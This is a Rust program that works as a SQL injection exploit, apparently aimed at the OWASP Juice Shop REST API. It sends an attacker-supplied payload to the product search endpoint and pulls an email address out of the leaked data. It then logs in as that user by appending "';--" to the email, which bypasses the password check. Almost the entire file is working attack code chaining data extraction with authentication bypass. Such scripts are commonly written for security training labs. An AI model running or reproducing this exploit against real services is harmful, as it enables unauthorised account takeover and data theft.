use std::{process, env};
use std::error::Error;
use reqwest::blocking::{Client, Response};
use serde_json::{json, from_str, Value};


struct Config {
    ip_address: String,
    port: u16,
    payload: String,
}

impl Config {
    fn new(mut args: std::env::Args) -> Result<Config, &'static str> {
        args.next();
        let ip_address = match args.next() {
            Some(arg) => arg,
            None => return Err("Didn't get an address argument"),
        };
        let port_arg = match args.next() {
            Some(arg) => arg,
            None => return Err("Didn't get an port argument"),
        };
        let port: u16 = match port_arg.parse::<u16>() {
            Ok(p) => p,
            Err(_) => return Err("Port argument must be a number between 0 and 65535"),
        };
        let payload = match args.next() {
            Some(arg) => arg,
            None => return Err("Didn't get any payload as argument"),
        };
        Ok(Config { ip_address, port, payload })
    }
}

fn sql_injection(config: &Config) -> Result<Response, Box<dyn Error>> {
    let url = format!("http://{}:{}/rest/products/search?q={}", config.ip_address, config.port, config.payload);
    let client = Client::new();
    let response = client.get(&url).send()?;

    Ok(response)
}

fn searching_val(data_base: &str, query: &str) -> Result<String, Box<dyn std::error::Error>> {
    let q = query.to_lowercase();
    let v: Value = from_str(data_base)?;
    if let Some(data) = v.get("data").and_then(|d| d.as_array()) {
        for item in data {
            if let Some(name) = item.get("name").and_then(|n| n.as_str()) {
                if name.to_lowercase().contains(&q) && name.contains('@') {
                    return Ok(name.to_string());
                }
            }
        }
    }
    Err(format!("Email containing '{}' not found", query).into())
}  

fn login(email: &str, config: &Config) -> Result<Response, Box<dyn Error>> {
    let url = format!("http://{}:{}/rest/user/login",config.ip_address, config.port);
    let client = Client::builder().build()?;
    let username = format!("{}';--", email);
    let password = String::from("password");
    let payload = json!({
        "email": username,
        "password": password
    });
    let response = client.post(&url).json(&payload).send()?;

    Ok(response)

}

fn run(config: Config, ) -> Result<(), Box<dyn Error>> {
    let sql_response = sql_injection(&config)?;
    println!("[*] Status: {:?}", sql_response.status());
    let data_base = sql_response.text()?;
    println!("[*] Data base: {:?}", data_base);
    let email = searching_val(&data_base, "chris")?;
    println!("Found email: {}", email);
    let access = login(&email, &config)?;
    println!("[*] Login status: {:?}", access.status());
    println!("[*] Login response: {:?}", access.text());
    Ok(())
}

fn main() {
    let config = Config::new(env::args()).unwrap_or_else(|err| {
        eprintln!("Problem with parsing arguments{}", err);
        process::exit(1);
    });
    println!("[*] Starting client {}:{}{}", config.ip_address, config.port, config.payload);
    if let Err(err) = run(config) {
        eprintln!("Application error {}", err);
        process::exit(1);
    }
}
